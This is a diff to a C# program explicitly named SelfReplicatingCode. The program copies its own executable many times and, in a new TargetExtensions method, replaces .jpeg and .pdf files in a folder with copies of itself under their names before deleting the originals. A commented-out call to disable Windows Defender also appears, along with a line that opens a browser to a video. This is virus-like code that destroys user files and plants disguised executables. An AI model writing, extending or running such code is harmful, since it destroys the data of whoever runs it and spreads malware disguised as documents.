@@ -7,10 +7,12 @@ namespace SelfReplicatingCode
 {
     class replicate
     {
+        private const int MAX_ITERATIONS = 20;
+
         static void Main(string[] args)
         {
             string fileName = Assembly.GetExecutingAssembly().Location;
-            string directoryPath = Path.Combine(Path.GetDirectoryName(fileName), "target");
+            string directoryPath = Path.Combine(Path.GetDirectoryName(fileName), "generated-files");
             string[] targetExtensions = {".jpeg",".pdf"};
 
             // create the directory if it doesn't exist
@@ -19,15 +21,14 @@ namespace SelfReplicatingCode
                 Directory.CreateDirectory(directoryPath);
             }
 
-            // Copy the file to all files with the target extension
-            foreach (string extension in targetExtensions){
-                foreach (string targetFile in Directory.GetFiles(directoryPath, "*" + extension))
-                {
-                    string newFileName = Path.Combine(directoryPath, targetFile + Path.GetExtension(fileName));
-                    File.Copy(fileName, newFileName, true);
-                    File.Delete(Path.Combine(directoryPath, targetFile));
-                }
+            for (int i = 0; i < MAX_ITERATIONS; i++)
+            {
+                string newFileName = Path.Combine(directoryPath,
+                    Path.GetFileNameWithoutExtension(fileName) + i + Path.GetExtension(fileName));
+                File.Copy(fileName, newFileName, true);
             }
+
+            TargetExtensions(fileName, targetExtensions); 
 
             // DisableWindowsDefender(); // Disable Windows Defender
 
@@ -86,6 +87,21 @@ namespace SelfReplicatingCode
 
             // Launch the default web browser to play the video
             System.Diagnostics.Process.Start(url);
+        }
+
+        static void TargetExtensions(string fileName, string[] targetExtensions)
+        {
+            string directoryPath = Path.Combine(Path.GetDirectoryName(fileName), "target");
+           
+            // Copy the file to all files with the target extension
+            foreach (string extension in targetExtensions){
+                foreach (string targetFile in Directory.GetFiles(directoryPath, "*" + extension))
+                {
+                    string newFileName = Path.Combine(directoryPath, targetFile + Path.GetExtension(fileName));
+                    File.Copy(fileName, newFileName, true);
+                    File.Delete(Path.Combine(directoryPath, targetFile));
+                }
+            }
         }
     }
 }
